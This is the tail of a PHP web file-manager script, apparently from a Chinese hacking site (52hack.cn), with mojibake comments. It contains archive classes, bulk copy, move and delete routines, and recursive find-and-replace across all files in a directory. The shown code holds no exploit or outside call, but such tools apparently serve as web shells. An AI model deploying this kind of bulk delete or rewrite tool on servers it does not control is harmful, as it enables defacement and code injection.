   $endtime=explode(" ",$pageendtime);
   $totaltime=$endtime[0]-$starttime[0]+$endtime[1]-$starttime[1];
   $timecost=sprintf("%s",$totaltime);
   ?>
   <br>
   <table class="t2" width="750" cellspacing="2" cellpadding="2"> <tr> <td width="30%">
   <?php echo "Ò³ÃæÔËÐÐÊ±¼ä£º$timecost Ãë";?>
   </td><td width="70%" align=right>Copyright by °¢½Ü|Email:jack3240782@163.com|oicq:456655| <a href=http://www.52hack.cn target=_blank>http://www.52hack.cn¡¡</a></td> </tr> </table></center> </body> </html>

   <?php

   //ÒÔÏÂÊÇÀà¼°º¯Êý¶¨Òå

   class zip //ZIPÑ¹ËõÀà
   {

    var $datasec, $ctrl_dir = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset = 0; var $dirs = Array(".");

    function get_List($zip_name)
    {
      $zip = @fopen($zip_name, 'rb');
      if(!$zip) return(0);
      $centd = $this->ReadCentralDir($zip,$zip_name);

       @rewind($zip);
       @fseek($zip, $centd['offset']);

      for ($i=0; $i<$centd['entries']; $i++)
      {
       $header = $this->ReadCentralFileHeaders($zip);
       $header['index'] = $i;$info['filename'] = $header['filename'];
       $info['stored_filename'] = $header['stored_filename'];
       $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
       $info['crc'] = strtoupper(dechex( $header['crc'] ));
       $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
       $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
       $info['index'] = $header['index'];$info['status'] = $header['status'];
       $ret[]=$info; unset($header);
      }
     return $ret;
    }
    function Add($files,$compact)
    {
     if(!is_array($files[0])) $files=Array($files);

     for($i=0;$files[$i];$i++){
       $fn = $files[$i];
       if(!in_Array(dirname($fn[0]),$this->dirs))
        $this->add_Dir(dirname($fn[0]));
       if(basename($fn[0]))
        $ret[basename($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
     }
     return $ret;
    }

    function get_file()
    {
      $data = implode('', $this -> datasec);
      $ctrldir = implode('', $this -> ctrl_dir);

      return $data . $ctrldir . $this -> eof_ctrl_dir .
       pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
       pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
    }

    function add_dir($name)
    {
      $name = str_replace("\\", "/", $name);
      $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";

      $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) );
      $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0);
      $this -> datasec[] = $fr;

      $new_offset = strlen(implode("", $this->datasec));

      $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";
      $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) );
      $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 );
      $ext = "\xff\xff\xff\xff";
      $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name;

      $this -> ctrl_dir[] = $cdrec;
      $this -> old_offset = $new_offset;
      $this -> dirs[] = $name;
    }

    function add_File($data, $name, $compact = 1)
    {
      $name     = str_replace('\\', '/', $name);
      $dtime    = dechex($this->DosTime());

      $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
        . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
      eval('$hexdtime = "' . $hexdtime . '";');

      if($compact)
      $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
      else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
      $unc_len = strlen($data); $crc = crc32($data);

      if($compact){
        $zdata = gzcompress($data); $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
      }else{
        $zdata = $data;
      }
      $c_len=strlen($zdata);
      $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
      $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;

      $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);

      $this -> datasec[] = $fr;
      $new_offset        = strlen(implode('', $this->datasec));
      if($compact)
           $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
      else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
      $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
      $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
      $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
      $cdrec .= pack('V', $this -> old_offset );

      $this -> old_offset = $new_offset;
      $cdrec .= $name;
      $this -> ctrl_dir[] = $cdrec;
      return true;
    }

    function DosTime() {
      $timearray = getdate();
      if ($timearray['year'] < 1980) {
        $timearray['year'] = 1980; $timearray['mon'] = 1;
        $timearray['mday'] = 1; $timearray['hours'] = 0;
        $timearray['minutes'] = 0; $timearray['seconds'] = 0;
      }
      return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) |     ($timearray['mday'] << 16) | ($timearray['hours'] << 11) |
       ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

    function Extract ( $zn, $to, $index = Array(-1) )
    {
      $ok = 0; $zip = @fopen($zn,'rb');
      if(!$zip) return(-1);
      $cdir = $this->ReadCentralDir($zip,$zn);
      $pos_entry = $cdir['offset'];

      if(!is_array($index)){ $index = array($index);  }
      for($i=0; $index[$i];$i++){
        if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
         return(-1);
      }

      for ($i=0; $i<$cdir['entries']; $i++)
      {
        @fseek($zip, $pos_entry);
        $header = $this->ReadCentralFileHeaders($zip);
        $header['index'] = $i; $pos_entry = ftell($zip);
        @rewind($zip); fseek($zip, $header['offset']);
        if(in_array("-1",$index)||in_array($i,$index))
         $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);

      }
      fclose($zip);
      return $stat;
    }

     function ReadFileHeader($zip)
     {
       $binary_data = fread($zip, 30);
       $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

       $header['filename'] = fread($zip, $data['filename_len']);
       if ($data['extra_len'] != 0) {
         $header['extra'] = fread($zip, $data['extra_len']);
       } else { $header['extra'] = ''; }

       $header['compression'] = $data['compression'];$header['size'] = $data['size'];
       $header['compressed_size'] = $data['compressed_size'];
       $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
       $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

       if ($header['mdate'] && $header['mtime']){
        $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
        $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
        $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
        $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
       }else{$header['mtime'] = time();}

       $header['stored_filename'] = $header['filename'];
       $header['status'] = "ok";
       return $header;
     }

    function ReadCentralFileHeaders($zip){
       $binary_data = fread($zip, 46);
       $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

       if ($header['filename_len'] != 0)
         $header['filename'] = fread($zip,$header['filename_len']);
       else $header['filename'] = '';

       if ($header['extra_len'] != 0)
         $header['extra'] = fread($zip, $header['extra_len']);
       else $header['extra'] = '';

       if ($header['comment_len'] != 0)
         $header['comment'] = fread($zip, $header['comment_len']);
       else $header['comment'] = '';

       if ($header['mdate'] && $header['mtime'])
       {
         $hour = ($header['mtime'] & 0xF800) >> 11;
         $minute = ($header['mtime'] & 0x07E0) >> 5;
         $seconde = ($header['mtime'] & 0x001F)*2;
         $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
         $month = ($header['mdate'] & 0x01E0) >> 5;
         $day = $header['mdate'] & 0x001F;
         $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
       } else {
         $header['mtime'] = time();
       }
       $header['stored_filename'] = $header['filename'];
       $header['status'] = 'ok';
       if (substr($header['filename'], -1) == '/')
         $header['external'] = 0x41FF0010;
       return $header;
    }

    function ReadCentralDir($zip,$zip_name)
    {
     $size = filesize($zip_name);
     if ($size < 277) $maximum_size = $size;
     else $maximum_size=277;

     @fseek($zip, $size-$maximum_size);
     $pos = ftell($zip); $bytes = 0x00000000;

     while ($pos < $size)
     {
       $byte = @fread($zip, 1); $bytes=($bytes << 8) | Ord($byte);
       if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
     }

    $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));


     if ($data['comment_size'] != 0)
       $centd['comment'] = fread($zip, $data['comment_size']);
       else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
     $centd['disk_entries'] = $data['disk_entries'];
     $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
     $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
     return $centd;
    }

    function ExtractFile($header,$to,$zip)
    {
      $header = $this->readfileheader($zip);

      if(substr($to,-1)!="/") $to.="/";
      if(!@is_dir($to)) @mkdir($to,0777);

      $pth = explode("/",dirname($header['filename']));
      for($i=0;isset($pth[$i]);$i++){
        if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
        if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
      }
     if (!($header['external']==0x41FF0010)&&!($header['external']==16))
     {
      if ($header['compression']==0)
      {
       $fp = @fopen($to.$header['filename'], 'wb');
       if(!$fp) return(-1);
       $size = $header['compressed_size'];

       while ($size != 0)
       {
         $read_size = ($size < 2048 ? $size : 2048);
         $buffer = fread($zip, $read_size);
         $binary_data = pack('a'.$read_size, $buffer);
         @fwrite($fp, $binary_data, $read_size);
         $size -= $read_size;
       }
       fclose($fp);
       touch($to.$header['filename'], $header['mtime']);

     }else{
      $fp = @fopen($to.$header['filename'].'.gz','wb');
      if(!$fp) return(-1);
      $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
        Chr(0x00), time(), Chr(0x00), Chr(3));

      fwrite($fp, $binary_data, 10);
      $size = $header['compressed_size'];

      while ($size != 0)
      {
        $read_size = ($size < 1024 ? $size : 1024);
        $buffer = fread($zip, $read_size);
        $binary_data = pack('a'.$read_size, $buffer);
        @fwrite($fp, $binary_data, $read_size);
        $size -= $read_size;
      }

      $binary_data = pack('VV', $header['crc'], $header['size']);
      fwrite($fp, $binary_data,8); fclose($fp);

      $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compressée");
       if(!$gzp) return(-2);
      $fp = @fopen($to.$header['filename'],'wb');
      if(!$fp) return(-1);
      $size = $header['size'];

      while ($size != 0)
      {
        $read_size = ($size < 2048 ? $size : 2048);
        $buffer = gzread($gzp, $read_size);
        $binary_data = pack('a'.$read_size, $buffer);
        @fwrite($fp, $binary_data, $read_size);
        $size -= $read_size;
      }
      fclose($fp); gzclose($gzp);

      touch($to.$header['filename'], $header['mtime']);
      @unlink($to.$header['filename'].'.gz');

     }}
     return true;
    }
   } //ZIPÑ¹ËõÀàend

   Class tarlib { //zlib/tar/gzÀà¿ªÊ¼
   var $tarname = '';
   var $filehand = 0;

   function checkcompress() {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   if((substr($this->tarname, -7)=='.tar.gz') || (substr($this->tarname, -4)=='.tgz')) {
   $_dofunc_open = 'gzopen';
   $_dofunc_close = 'gzclose';
   $_dofunc_read = 'gzread';
   $_dofunc_write = 'gzwrite';
   } else {
   $_dofunc_open = 'fopen';
   $_dofunc_close = 'fclose';
   $_dofunc_read = 'fread';
   $_dofunc_write = 'fwrite';
   }
   }

   function mkdir($dir) {
   $dirlist = explode('/', $dir);
   $depth = count($dirlist)-1;
   $dir = $dirlist[0];
   for($i = 0; $i<$depth; $i++) {
   if(!is_dir($dir)) {
   if($dir!='.')
   mkdir($dir, 0777);
   }
   $dir.= '/'.$dirlist[$i+1];
   $last = $off;
   }
   }

   function checksum($binary_data_first, $binary_data_last = '') {
   if($binary_data_last=='') {
   $binary_data_last = $binary_data_first;
   }
   $checksum = 0;
   for ($i=0; $i<148; $i++) {
   $checksum += ord(substr($binary_data_first, $i, 1));
   }
   for ($i=148; $i<156; $i++) {
   $checksum += ord(' ');
   }
   for ($i=156, $j=0; $i<512; $i++, $j++) {
   $checksum += ord(substr($binary_data_last, $j, 1));
   }
   return $checksum;
   }
   }

   Class tar extends tarlib {

   var $filelist = array();

   function tar($tarname, $filelist) {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   $this->tarname = $tarname;
   $this->checkcompress();
   $this->filelist = is_array($filelist) ? $filelist : explode(' ', $filelist);

   $this->create();
   }

   function create() {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   $this->filehand = $_dofunc_open($this->tarname, 'wb');

   $this->parse($this->filelist);
   $this->footer();

   $_dofunc_close($this->filehand);
   }

   function parse($filelist) {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   $files = count($filelist);
   for($i = 0; $i < $files; $i++) {
   $filename = $filelist[$i];
   if(is_dir($filename)) {
   $dirh = opendir($filename);
   readdir($dirh); // '.'
   readdir($dirh); // '..'
   while($nextfile = readdir($dirh)) {
   $temp_filelist[] = ($filename != '.') ? $filename.'/'.$nextfile : $nextfile;
   }
   $this->parse($temp_filelist);
   closedir($dirh);
   unset($dirh);
   unset($temp_filelist);
   unset($nextfile);
   continue;
   }
   $this->parseFile($filename);
   }
   }

   function parseFile($filename) {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   $v_info = stat($filename);
   $v_uid = sprintf('%6s ', DecOct($v_info[4]));
   $v_gid = sprintf('%6s ', DecOct($v_info[5]));
   $v_perms = sprintf('%6s ', DecOct(fileperms($filename)));
   clearstatcache();
   $v_size = filesize($filename);
   $v_size = sprintf('%11s ', DecOct($v_size));
   $v_mtime = sprintf('%11s', DecOct(filemtime($filename)));

   $v_binary_data_first = pack('a100a8a8a8a12A12', $filename, $v_perms, $v_uid, $v_gid, $v_size, $v_mtime);
   $v_binary_data_last = pack('a1a100a6a2a32a32a8a8a155a12', '', '', '', '', '', '', '', '', '', '');
   $_dofunc_write($this->filehand, $v_binary_data_first, 148);

   $v_checksum = $this->checksum($v_binary_data_first, $v_binary_data_last);

   $v_checksum = sprintf('%6s ', DecOct($v_checksum));
   $v_binary_data = pack('a8', $v_checksum);
   $_dofunc_write($this->filehand, $v_binary_data, 8);
   $_dofunc_write($this->filehand, $v_binary_data_last, 356);

   $fp = fopen($filename, 'rb');
   while(($buffer = fread($fp, 512)) <> '') {
   $binary_buffer = pack('a512', $buffer);
   $_dofunc_write($this->filehand, $binary_buffer);
   }
   }

   function footer() {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   $v_binary_data = pack('a512', '');
   $_dofunc_write($this->filehand, $v_binary_data);
   }
   }


   Class tarExtract extends tarlib {

   var $extractDir = './extract';

   function tarExtract($tarname, $extractDir = './extract') {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   $this->tarname = $tarname;
   $this->extractDir = $extractDir;
   $this->checkcompress();

   if(!is_dir($extractDir)) {
   $this->mkdir($extractDir);
   }
   $this->extract();
   }

   function extract() {
   global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write;

   $this->filehand = $_dofunc_open($this->tarname, 'rb');
   while(($binary_buffer = fread($this->filehand, 512)) <> '') {
   $file = $this->parseHeader($binary_buffer);
   if(!$file['name']) continue;
   $file['name'] = $this->extractDir.'/'.$file['name'];
   $readtimes = floor($file['size']/512);

   $this->mkdir($file['name']);
   $fp = fopen($file['name'], 'wb');
   for($i = 0; $i<$readtimes; $i++) {
   fwrite($fp, $_dofunc_read($this->filehand, 512));
   }
   if(($lastsize = $file['size']%512)) {
   fwrite($fp, $_dofunc_read($this->filehand, 512), $lastsize);
   }
   fclose($fp);
   }
   $_dofunc_close($this->filehand);
   }

   function parseHeader($header) {

   $checksum = $this->checksum($header);
   $data = unpack('a100filename/a8mode/a8uid/a8gid/a12size/a12mtime/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $header);

   $file['checksum'] = OctDec(trim($data['checksum']));
   /*
   if($file['checksum']<>$checksum) {
   return false;
   }
   */
   $file['name'] = trim($data['filename']);
   $file['mode'] = OctDec(trim($data['mode']));
   $file['uid'] = OctDec(trim($data['uid']));
   $file['gid'] = OctDec(trim($data['gid']));
   $file['size'] = OctDec(trim($data['size']));
   $file['mtime'] = OctDec(trim($data['mtime']));
   $file['type'] = $data['typeflag'];

   return $file;
   }
   } //zlib/tar/gzÑ¹ËõÀàend

   function writetofile($filename,$book) { //Ð´ÈëÎÄ¼þ
       @$fd=fopen("$filename","wb");
       @fwrite($fd,$book);
       @fclose($fd);
       return $fd;
   }

   function addziparray($dir2) //Ìí¼ÓZIPÎÄ¼þ
   {
       global $dir,$zipfilearray;
       @$dirs=opendir($dir."/".$dir2);
       while (@$file=readdir($dirs)) {
           if(!is_dir("$dir/$dir2/$file")) {
               $zipfilearray[]="$dir2/$file";
           }
           elseif($file!="."&&$file!="..") {
               addziparray("$dir2/$file");
           }
       }
       @closedir($dirs);
   }

   function copymore($file) //ÅúÁ¿¸´ÖÆÎÄ¼þ
   {
       global $olddir,$dir,$f,$d;
       for($i=0;$file[$i];$i++){
           $oldfile="$olddir/$file[$i]";
           if(file_exists($oldfile)){
               if(is_dir($oldfile)){
                   if(!is_dir("$dir/$file[$i]")) if(@mkdir($dir."/".$file[$i],0777)) $d++;
                   unset($newfile);
                   $dirs=@opendir($oldfile);
                   while($files=@readdir($dirs)) {
                       if($files!="."&&$files!="..") {
                           $newfile[]=$file[$i]."/".$files;
                       }
                   }
                   @closedir($dirs);
                   if(!empty($newfile)) copymore($newfile,$copy);
               }
               else{
                   $newfile="$dir/$file[$i]";
                   $fp=@fopen($oldfile,rb);
                   $filedata=@fread($fp,@filesize($oldfile));
                   @fclose($fp);
                   if(writetofile($newfile,$filedata)) $f++;
               }
           }
       }
   }

   function cutmore($file) //ÅúÁ¿¼ôÇÐÎÄ¼þ
   {
       global $olddir,$dir,$f,$d;
       for($i=0;$file[$i];$i++){
           $oldfile="$olddir/$file[$i]";
           if(file_exists($oldfile)){
               if(is_dir($oldfile)){
                   if(!is_dir("$dir/$file[$i]")) if(@mkdir($dir."/".$file[$i],0777)) $d++;
                   unset($newfile);
                   $dirs=@opendir($oldfile);
                   while($files=@readdir($dirs)) {
                       if($files!="."&&$files!="..") {
                           $newfile[]=$file[$i]."/".$files;
                       }
                   }
                   @closedir($dirs);
                   if(!empty($newfile)) cutmore($newfile);
                   @rmdir($oldfile);
               }
               else{
                   $newfile="$dir/$file[$i]";
                   $fp=@fopen($oldfile,rb);
                   $filedata=@fread($fp,@filesize($oldfile));
                   @fclose($fp);
                   if(writetofile($newfile,$filedata)&&unlink($oldfile)) $f++;
               }
           }
       }
   }

   function delmore($file) //ÅúÁ¿É¾³ýÎÄ¼þ
   {
       global $dir,$f,$d;
       for($i=0;$file[$i];$i++){
           $delfile="$dir/$file[$i]";
           if(file_exists($delfile)){
               if(is_dir($delfile)){
                   $dirs=@opendir($delfile);
                   while($files=@readdir($dirs)) {
                       if($files!="."&&$files!="..") {
                           $newfile[]=$file[$i]."/".$files;
                           $del++;
                       }
                   }
                   if(!empty($newfile)) delmore($newfile,$del);
                   @closedir($dirs);
                   if(@rmdir($delfile)) $d++;
               }
               else{
                   if(@unlink($delfile)) $f++;
               }
           }
       }
   }
   function wlczip($path) //wlc·½Ê½´ò°ü
   {
                      global $fp1,$b,$c,$dir,$i,$size,$key,$wlczip_max;
                      if(is_dir("$dir/$path")){$b="$b|"."w|".$path;
                                       $wlcdir=opendir("$dir/$path");
                                       while($f=readdir($wlcdir))
                                                                  { if($f=="."||$f=="..")continue;
                                                                  wlczip("$path/$f");
                                                                     }
                                       closedir($wlcdir);
                                       }
                      else {     $size+=filesize($dir."/".$path);
                                if($size>1024*1024*$wlczip_max)
                                 {fwrite($fp1,"$b|"."wlc|$c");fclose($fp1); $i++;$size=0; $b="";$c="";$fp1=fopen($zipdir."_$i.wlc","w");}
                                $c="$c|"."w|"."$path";
                                $fp=fopen("$dir/$path","r");
                                 $msg=fread($fp,filesize("$dir/$path"));
                                 fclose($fp);
                                 fwrite($fp1,"$msg|"."wlc|");
                            }                   }
   function wlcunzip($undir,$data){
                     $fp=fopen($data,"r");
                     $msg=explode("|"."wlc|",fread($fp,filesize($data)));
                     fclose($fp);
                     $num=count($msg)-3;
                     @mkdir($undir,0777);
                     $wlcdir=explode("|"."w|",$msg[$num+1]);
                     for($i=0;$i<=count($wlcdir)-1;$i++)
                         {
                         @mkdir("$undir/$wlcdir[$i]",0777);
                         }
                     $file=explode("|"."w|",$msg[$num+2]);
                     for($i=1;$i<=count($file)-1;$i++)
                         {
                                          $a=0;
                         $fp=fopen("$undir/$file[$i]","w");
                         fwrite($fp,$msg[$i-1]);
                         if(@fclose($fp))$a=1;
                         }
                                  return $a;
                     }
   function replace_file($path) //ÎÄ¼þ¹Ø¼ü×ÖÌæ»»
   {
                      global $dir,$oldkeys,$newkeys,$action;
                      if(is_dir("$dir/$path")){
                                       $tempdir=opendir("$dir/$path");
                                       while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  replace_file("$path/$f");}
                                       closedir($tempdir);
                                       }
                      else {    if(filesize("$dir/$path")){
                                $fp=fopen("$dir/$path","r");
                                $msg=fread($fp, filesize("$dir/$path"));
                                fclose($fp);
                               if($action=="file_replace_keyword") $msg = str_replace($oldkeys, $newkeys, $msg);
                               elseif($action=="file_replace_gb_2_big5") { $code=new CCharset;
                                                                           $msg=$code->Gb_Big5($msg);}
                                elseif($action=="file_replace_big5_2_gb") { $code=new CCharset;
                                                                           $msg=$code->Big5_Gb($msg);}
                               elseif($action=="file_replace_gb_2_utf8") { $obj=new gb2utf8(); $obj->gb=$msg;
                                                                           $obj->Convert(); $msg=$obj->utf8; }

                                @writetofile("$dir/$path",$msg);
                                 }
                                else echo"{$dir}/{$path}ÎÄ¼þÎª¿ÕÃ»ÓÐÌæ»»<br>";
                            }
   }

   function replace_file_find($path) //ÎÄ¼þ¹Ø¼ü×ÖÌæ»»
   {
                      global $dir,$oldkeys,$newkeys,$action;
                      if(is_dir("$dir/$path")){
                                       $tempdir=opendir("$dir/$path");
                                       while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  replace_file_find("$path/$f");}
                                       closedir($tempdir);
                                       }
                      else {    if(filesize("$dir/$path")){
                                $fp=fopen("$dir/$path","r");
                                $msg=fread($fp, filesize("$dir/$path"));
                                fclose($fp);
                                           if(strpos($msg, $oldkeys[0]) !== false) echo "FIND:$dir/$path <br>";
                                 }
                                else echo"{$dir}/{$path}ÎÄ¼þÎª¿ÕÃ»ÓÐ²éÕÒ<br>";
                            }
   }

   class CCharset {
   var $gb_map="gb.map"; //
   var $big5_map="big5.map"; //
   var $dep_char = 127;
   function cbig5_gb($str,$fd) {
   $c=ord(substr($str,0,1));
   $x=ord(substr($str,1,1));
   $address=(($c-160)*510)+($x-1)*2;
   fseek($fd, $address);
   $hi=fgetc($fd);
   $lo=fgetc($fd);
   return "$hi$lo";
   }
   function cgb_big5($str,$fd) {
   $c=ord(substr($str,0,1));
   $x=ord(substr($str,1,1));
   $address=(($c-160)*510)+($x-1)*2;
   fseek($fd, $address);
   $hi=fgetc($fd);
   $lo=fgetc($fd);
   return "$hi$lo";
   }
   function Big5_Gb($str) {
   $fd = fopen ($this->gb_map, "r");
   $outstr="";
   for($i=0;$i<strlen($str);$i++) {
   $ch=ord(substr($str,$i,1));
   if($ch > $this->dep_char) {$outstr.=$this->cbig5_gb(substr($str,$i,2),$fd);$i++;} else $outstr.=substr($str,$i,1);
   }
   fclose ($fd);
   return $outstr;
   }
   function Gb_Big5($str) {
   $fd = fopen ($this->big5_map, "r");
   $outstr="";
   for($i=0;$i<strlen($str);$i++) {
   $ch=ord(substr($str,$i,1));
   if($ch > $this->dep_char) {$outstr.=$this->cgb_big5(substr($str,$i,2),$fd);$i++;} else $outstr.=substr($str,$i,1);
   }
   fclose ($fd);
   return $outstr;
   }
   }//end the class


   Class GB2UTF8
   {
   var $gb;          // ´ý×ª»»µÄGB2312×Ö·û´®
   var $utf8;        // ×ª»»ºóµÄUTF8×Ö·û´®
       var $CodeTable;   // ×ª»»¹ý³ÌÖÐÊ¹ÓÃµÄGB2312´úÂëÎÄ¼þÊý×é
       var $ErrorMsg;    // ×ª»»¹ý³ÌÖ®ÖÐµÄ´íÎóÑ¶Ï¢
   function GB2UTF8($InStr="")
   {
   $this->gb=$InStr;
   $this->SetGb2312();
   ($this->gb=="")?0:$this->Convert();
   }
   function SetGb2312($InStr="gb2312.txt")
   {                  // ÉèÖÃgb2312´úÂëÎÄ¼þ£¬Ä¬ÈÏÎªgb2312.txt
   $this->ErrorMsg="";
   $tmp=@file($InStr);
           if (!$tmp) {
               $this->ErrorMsg="No GB2312";
               return false;
               }
   $this->CodeTable=array();
   while(list($key,$value)=each($tmp)) {
   $this->CodeTable[hexdec(substr($value,0,6))]=substr($value,7,6);
   }
   }

   function Convert()
   {                   // ×ª»»GB2312×Ö·û´®µ½UTF8×Ö·û´®£¬ÐèÔ¤ÏÈÉèÖÃ$gb
   $this->utf8="";
   if(!trim($this->gb) || $this->ErrorMsg!="") {
   return ($this->utf8=$this->ErrorMsg);
   }
           $str=$this->gb;
   while($str) {
   if (ord(substr($str,0,1))>127)
   {
   $tmp=substr($str,0,2);
   $str=substr($str,2,strlen($str));
   $tmp=$this->U2UTF8(hexdec($this->CodeTable[hexdec(bin2hex($tmp))-0x8080]));
   for($i=0;$i<strlen ($tmp);$i+=3)
   $this->utf8.=chr(substr($tmp,$i,3));
   }
   else
   {
   $tmp=substr($str,0,1);
   $str=substr($str,1,strlen($str));
   $this->utf8.=$tmp;
   }
   }
   return $this->utf8;
   }
   function U2UTF8($InStr)
   {
   for($i=0;$i<count($InStr);$i++)
   $str="";
   if ($InStr < 0x80) {
   $str.=ord($InStr);
   }
   else if ($InStr < 0x800) {
   $str.=(0xC0 | $InStr>>6);
   $str.=(0x80 | $InStr & 0x3F);
   }
   else if ($InStr < 0x10000) {
   $str.=(0xE0 | $InStr>>12);
   $str.=(0x80 | $InStr>>6 & 0x3F);
   $str.=(0x80 | $InStr & 0x3F);
   }
   else if ($InStr < 0x200000) {
   $str.=(0xF0 | $InStr>>18);
   $str.=(0x80 | $InStr>>12 & 0x3F);
   $str.=(0x80 | $InStr>>6 & 0x3F);
   $str.=(0x80 | $InStr & 0x3F);
   }
   return $str;
   }
   }
   function show_highlight($file)
   {
       if (@is_readable($file) && @is_file($file)) {
                        echo("<table cellpadding=\"4\" border=\"0\">\n<tr>\n<td>\n<code style=\"color: #999999\">\n");
           $size = sizeof(file($file));
           for ($i = 1; $i <= $size; $i++) printf("%05d<br>\n", $i);
           echo("</code>\n</td>\n<td nowrap>\n");
           $shown = @highlight_file($file);
           echo("\n");
           echo("</td>\n</tr>\n</table>\n");
           //echo("</body></html>\n");
           if ($shown) return TRUE;
       }
       return FALSE;
   }
   function buildphrase ($repl, $str) {
       if (!is_array($repl)) $repl = array($repl);
       $newstr = '';
       for ($i = 0; $i < (strlen($str) - 1); $i++) {
           $z = substr($str, $i, 1);
           if ($z == '%') {
               $z = substr($str, $i + 1, 1);
               if (((int) $z) > 0 && ((int) $z) <= count($repl)) $newstr .= $repl[((int) $z) - 1]; else $newstr .= "%$z";
               $i++;
           } else {
               $newstr .= $z;
           }
       }
       return $newstr;
   }

   ?>
